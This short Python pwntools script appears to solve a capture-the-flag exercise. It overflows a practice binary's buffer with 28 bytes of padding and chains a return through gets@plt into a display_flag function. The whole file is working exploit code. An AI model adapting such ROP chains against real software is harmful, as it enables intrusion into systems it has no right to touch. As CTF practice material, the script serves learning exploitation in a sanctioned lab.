from pwn import *

context.arch = 'i386'

con = process('/problems/leap-frog_1_2944cde4843abb6dfd6afa31b00c703c/rop')

con.recvregex('Enter your input> ')
payload = 'A' * 28
payload += pack(0x08048430)  # gets@plt
payload += pack(0x080486b3)  # display_flag
payload += pack(0x0804a03d)
con.sendline(payload)

con.sendline('AAA')

print con.recvall()
